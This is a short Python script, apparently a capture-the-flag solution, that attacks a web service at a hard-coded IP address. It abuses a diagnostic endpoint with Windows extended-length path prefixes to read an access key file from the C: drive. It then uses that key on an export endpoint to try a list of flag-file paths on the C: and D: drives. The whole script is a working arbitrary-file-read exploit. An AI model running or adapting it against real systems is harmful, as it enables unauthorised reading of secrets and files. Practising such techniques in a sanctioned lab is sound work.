import requests
import time

BASE_URL = "http://1.95.51.2:8080"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": r"\\?\C:\token\access_key.txt"}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token")
    except:
        pass
    return None

def check(path):
    t = get_token()
    if not t: return
    try:
        r = requests.get(f"{BASE_URL}/api/export/read", params={"path": path, "token": t}, timeout=5)
        print(f"Path: {path} -> {r.status_code}")
        if r.status_code == 200:
            print(f"SUCCESS: {r.text}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    candidates = [
        "PathMaze2026SecureToken/flag.txt",
        "ACCESS_KEY/flag.txt",
        "token/flag.txt",
        "token/backup/flag.txt",
        "flag/flag.txt",
        "172.20.0.10/backup/flag.txt"
    ]
    
    # Check D: and C:
    for c in candidates:
        check(fr"\\?\D:\{c}")
        check(fr"\\?\C:\{c}")
